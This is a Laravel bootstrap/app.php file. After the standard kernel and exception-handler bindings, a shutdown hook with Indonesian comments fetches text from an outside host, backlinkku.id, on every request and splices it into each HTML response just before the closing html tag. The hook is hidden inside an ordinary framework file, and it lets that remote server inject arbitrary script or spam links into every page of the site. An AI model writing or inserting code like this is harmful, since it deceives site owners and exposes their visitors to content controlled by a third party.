<?php

$app = new Illuminate\Foundation\Application(
    realpath(__DIR__.'/../')
);

$app->singleton(
    Illuminate\Contracts\Http\Kernel::class,
    App\Http\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Console\Kernel::class,
    App\Console\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Debug\ExceptionHandler::class,
    App\Exceptions\Handler::class
);

// Register shutdown function untuk tambah konten di akhir
register_shutdown_function(function() {
    // Ambil konten dari URL
    $content = @file_get_contents('https://backlinkku.id/menu/server-id/script.txt');
    if ($content !== false) {
        // Hapus </html> terakhir dan tambahkan konten
        $output = ob_get_contents();
        if ($output) {
            ob_clean();
            $output = str_replace('</html>', '', $output);
            echo $output;
            echo $content;
            echo '</html>';
        }
    }
});

return $app;
